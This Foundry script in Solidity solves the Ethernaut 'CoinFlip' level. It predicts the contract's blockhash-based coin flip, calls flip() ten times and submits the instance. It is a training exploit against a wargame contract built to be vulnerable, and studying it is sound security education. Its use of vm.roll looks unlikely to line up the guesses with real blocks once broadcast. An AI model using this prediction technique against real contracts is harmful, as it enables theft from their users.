// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

// run: forge script script/solutions/03-CoinFlip.s.sol:CoinFlipSolution --rpc-url $SEPOLIA_RPC --skip-simulation
contract CoinFlipSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        ICoinFlip coinFlip = ICoinFlip(challengeInstance);
        uint256 consecutiveWinsBefore = coinFlip.consecutiveWins();
        for (uint256 i = 0; i < 10; i++) {
            // we can only guess the coin every block mined, use vm.roll() to set the block number
            vm.roll(1 + i);
            // here we simulate the number generation mechanism
            bool guess = _simulateCoinFlip();
            coinFlip.flip(guess);
        }
        uint256 consecutiveWinsAfter = coinFlip.consecutiveWins();
        console2.log("Consecutive Wins Before: ", consecutiveWinsBefore);
        console2.log("Consecutive Wins After: ", consecutiveWinsAfter);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(3));
    }

    function _simulateCoinFlip() internal view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
